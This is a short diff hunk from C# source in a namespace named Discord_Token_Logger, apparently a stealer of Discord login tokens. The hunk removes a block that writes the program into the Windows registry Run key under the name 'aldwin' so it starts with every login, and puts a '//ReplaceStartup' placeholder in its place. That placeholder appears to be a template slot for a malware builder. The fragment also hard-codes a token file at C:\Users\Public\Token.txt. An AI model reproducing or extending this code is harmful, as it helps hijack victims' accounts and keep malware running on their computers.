@@ -23,10 +23,7 @@ namespace Discord_Token_Logger
             string Cookie = "";
             string CheckToken = @"C:\Users\Public\Token.txt";
 
-            using (Microsoft.Win32.RegistryKey Key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
-            {
-                Key.SetValue("aldwin", "\"" + Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "\"");
-            }
+            //ReplaceStartup
 
             Console.Read();
             while (true)
